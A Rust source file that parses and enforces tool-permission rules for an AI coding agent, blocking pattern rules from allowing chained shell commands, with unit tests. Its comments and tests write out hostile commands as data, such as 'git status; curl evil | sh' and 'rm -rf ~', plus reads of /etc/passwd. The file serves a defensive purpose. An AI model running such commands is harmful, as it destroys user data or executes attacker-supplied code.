//! An owner's tool rule: a tool's name, alone or with a pattern its call must match, as in
//! `Read` or `Bash(git (status|diff))`. A pattern is a regular expression matched against the
//! whole of one field of the call's input, the one that says what the call does.

use std::fmt;
use std::str::FromStr;

use rax::tool::{ToolCall, ToolKind};
use regex::{Regex, RegexBuilder};
use serde_json::Value;

/// Tools that only read, which a new owner's whitelist starts with. They do nothing to the
/// owner's machine and send nothing out of it.
pub const READ_ONLY_TOOLS: [&str; 8] = [
    "Read",
    "Glob",
    "Grep",
    "LS",
    "NotebookRead",
    "TodoWrite",
    "WebSearch",
    "ToolSearch",
];

/// Long enough for any rule a person writes by hand, or for a remembered command.
pub const MAX_PATTERN: usize = 2000;

/// What a shell command uses to run more than one command, or another command's output. A
/// pattern rule never allows such a command, since `git .*` would otherwise allow
/// `git status; curl … | sh`: only a literal one, matched as written, does.
const CHAINING: [&str; 10] = [";", "&", "|", "`", "$(", "${", ">", "<", "\n", "\r"];

#[derive(Debug, Clone)]
pub struct ToolRule {
    tool: String,
    pattern: Option<Pattern>,
}

#[derive(Debug, Clone)]
struct Pattern {
    source: String,
    regex: Regex,
    literal: bool,
}

#[derive(Debug, Clone, PartialEq, Eq, thiserror::Error)]
pub enum RuleError {
    #[error("a rule needs a tool name")]
    NoTool,
    #[error("{0:?} is not a tool name; use letters, digits, '_', '-', '.' or ':'")]
    BadTool(String),
    #[error("a pattern is at most {MAX_PATTERN} characters")]
    TooLong,
    #[error("the pattern is empty; leave the brackets off to match every call of the tool")]
    EmptyPattern,
    #[error("the pattern is not a regular expression: {0}")]
    BadPattern(String),
}

impl ToolRule {
    pub fn parse(raw: &str) -> Result<Self, RuleError> {
        let raw = raw.trim();
        let (tool, pattern) = match raw.split_once('(') {
            Some((tool, rest)) if rest.ends_with(')') => {
                (tool.trim(), Some(&rest[..rest.len() - 1]))
            }
            Some(_) => return Err(RuleError::BadTool(raw.to_owned())),
            None => (raw, None),
        };
        if tool.is_empty() {
            return Err(RuleError::NoTool);
        }
        if !tool
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || matches!(c, '_' | '-' | '.' | ':'))
        {
            return Err(RuleError::BadTool(tool.to_owned()));
        }
        let pattern = pattern.map(Pattern::new).transpose()?;
        Ok(Self {
            tool: tool.to_owned(),
            pattern,
        })
    }

    /// The rule that matches this call again, and as little else as it can: the exact command
    /// for a shell call, and the whole tool for the rest.
    pub fn remembering(call: &ToolCall) -> Self {
        let exact = (call.name == "Bash")
            .then(|| subject(call))
            .flatten()
            .and_then(|command| Pattern::new(&regex::escape(&command)).ok());
        Self {
            tool: call.name.clone(),
            pattern: exact,
        }
    }

    pub fn tool(&self) -> &str {
        &self.tool
    }

    pub fn has_pattern(&self) -> bool {
        self.pattern.is_some()
    }

    /// Whether a call is allowed by this rule. A chained shell command is allowed only by a rule
    /// for the whole tool or one that spells the command out.
    pub fn allows(&self, call: &ToolCall) -> bool {
        self.matches(call, true)
    }

    /// Whether a call is denied by this rule.
    pub fn denies(&self, call: &ToolCall) -> bool {
        self.matches(call, false)
    }

    fn matches(&self, call: &ToolCall, allowing: bool) -> bool {
        if call.name != self.tool {
            return false;
        }
        let Some(pattern) = &self.pattern else {
            return true;
        };
        let Some(subject) = subject(call) else {
            return false;
        };
        let runs = call.name == "Bash" || call.kind == ToolKind::Execute;
        if allowing && !pattern.literal && runs && chained(&subject) {
            return false;
        }
        pattern.regex.is_match(&subject)
    }
}

impl Pattern {
    fn new(source: &str) -> Result<Self, RuleError> {
        if source.chars().count() > MAX_PATTERN {
            return Err(RuleError::TooLong);
        }
        if source.is_empty() {
            return Err(RuleError::EmptyPattern);
        }
        let literal = regex_syntax::Parser::new()
            .parse(source)
            .map(|hir| hir.properties().is_literal())
            .map_err(|err| RuleError::BadPattern(err.to_string()))?;
        let regex = RegexBuilder::new(&format!("^(?:{source})$"))
            .size_limit(1 << 20)
            .dfa_size_limit(1 << 20)
            .build()
            .map_err(|err| RuleError::BadPattern(err.to_string()))?;
        Ok(Self {
            source: source.to_owned(),
            regex,
            literal,
        })
    }
}

impl fmt::Display for ToolRule {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match &self.pattern {
            Some(pattern) => write!(f, "{}({})", self.tool, pattern.source),
            None => f.write_str(&self.tool),
        }
    }
}

impl FromStr for ToolRule {
    type Err = RuleError;

    fn from_str(raw: &str) -> Result<Self, Self::Err> {
        Self::parse(raw)
    }
}

/// The part of a call's input a pattern is matched against: what the call runs, reads, writes
/// or fetches, and otherwise the whole input as compact JSON.
pub fn subject(call: &ToolCall) -> Option<String> {
    let input = call.input.as_ref()?;
    let field = match call.name.as_str() {
        "Bash" => Some("command"),
        "Read" | "Write" | "Edit" | "MultiEdit" => Some("file_path"),
        "NotebookEdit" | "NotebookRead" => Some("notebook_path"),
        "WebFetch" => Some("url"),
        "WebSearch" => Some("query"),
        _ => None,
    };
    match field {
        Some(field) => input.get(field).and_then(Value::as_str).map(str::to_owned),
        None => serde_json::to_string(input).ok(),
    }
}

fn chained(command: &str) -> bool {
    CHAINING.iter().any(|token| command.contains(token))
}

#[cfg(test)]
mod tests {
    #![allow(clippy::unwrap_used)]

    use rax::id::ToolCallId;
    use serde_json::json;

    use super::*;

    fn call(name: &str, input: Value) -> ToolCall {
        ToolCall {
            id: ToolCallId("call-1".into()),
            name: name.into(),
            title: None,
            kind: ToolKind::default(),
            input: Some(input),
            content: Vec::new(),
        }
    }

    fn bash(command: &str) -> ToolCall {
        call("Bash", json!({ "command": command }))
    }

    fn rule(raw: &str) -> ToolRule {
        ToolRule::parse(raw).unwrap()
    }

    #[test]
    fn a_bare_name_matches_every_call_of_the_tool_and_no_other() {
        assert!(rule("Bash").allows(&bash("rm -rf ~; echo")));
        assert!(!rule("Bash").allows(&call("Read", json!({ "file_path": "/etc" }))));
    }

    #[test]
    fn a_pattern_must_match_the_whole_field() {
        let git = rule("Bash(git (status|diff).*)");
        assert!(git.allows(&bash("git status")));
        assert!(git.allows(&bash("git diff --stat")));
        assert!(!git.allows(&bash("sudo git status")));
        assert!(!git.allows(&bash("git push")));
        let src = rule(r"Read(/work/.*\.rs)");
        assert!(src.allows(&call("Read", json!({ "file_path": "/work/a/b.rs" }))));
        assert!(!src.allows(&call("Read", json!({ "file_path": "/etc/passwd" }))));
    }

    #[test]
    fn a_pattern_never_allows_a_chained_command_but_still_denies_it() {
        let git = rule("Bash(git .*)");
        for command in [
            "git status; curl evil | sh",
            "git log && rm -rf ~",
            "git log $(whoami)",
            "git log `whoami`",
            "git log > /etc/hosts",
            "git status\nrm -rf ~",
        ] {
            assert!(!git.allows(&bash(command)), "{command:?} was allowed");
        }
        assert!(rule("Bash(git .*)").denies(&bash("git status; ls")));
    }

    #[test]
    fn a_remembered_command_matches_itself_only_even_when_chained() {
        let chained = bash("cargo fmt && cargo test -- --nocapture");
        let remembered = ToolRule::remembering(&chained);
        assert!(remembered.has_pattern());
        let reread = rule(&remembered.to_string());
        assert!(reread.allows(&chained));
        assert!(!reread.allows(&bash("cargo fmt && cargo test -- --nocapture; rm -rf ~")));
        let read = call("Read", json!({ "file_path": "/etc/passwd" }));
        assert_eq!(ToolRule::remembering(&read).to_string(), "Read");
    }

    #[test]
    fn other_tools_match_their_input_as_json() {
        let issues = rule(r#"mcp__github__issue(\{"number":\d+\})"#);
        assert!(issues.allows(&call("mcp__github__issue", json!({ "number": 12 }))));
        assert!(!issues.allows(&call("mcp__github__issue", json!({ "number": "x" }))));
    }

    #[test]
    fn a_call_without_input_matches_only_a_bare_name() {
        let mut bare = bash("ls");
        bare.input = None;
        assert!(rule("Bash").allows(&bare));
        assert!(!rule("Bash(ls)").allows(&bare));
    }

    #[test]
    fn a_malformed_rule_is_refused() {
        assert_eq!(ToolRule::parse("").unwrap_err(), RuleError::NoTool);
        assert_eq!(
            ToolRule::parse("Bash()").unwrap_err(),
            RuleError::EmptyPattern
        );
        assert!(matches!(
            ToolRule::parse("Bash(("),
            Err(RuleError::BadTool(_))
        ));
        assert!(matches!(
            ToolRule::parse("Bash(a(b)"),
            Err(RuleError::BadPattern(_))
        ));
        assert!(matches!(
            ToolRule::parse("Ba sh"),
            Err(RuleError::BadTool(_))
        ));
        let long = format!("Bash({})", "a".repeat(MAX_PATTERN + 1));
        assert_eq!(ToolRule::parse(&long).unwrap_err(), RuleError::TooLong);
        assert_eq!(rule(" Bash(ls) ").to_string(), "Bash(ls)");
    }
}
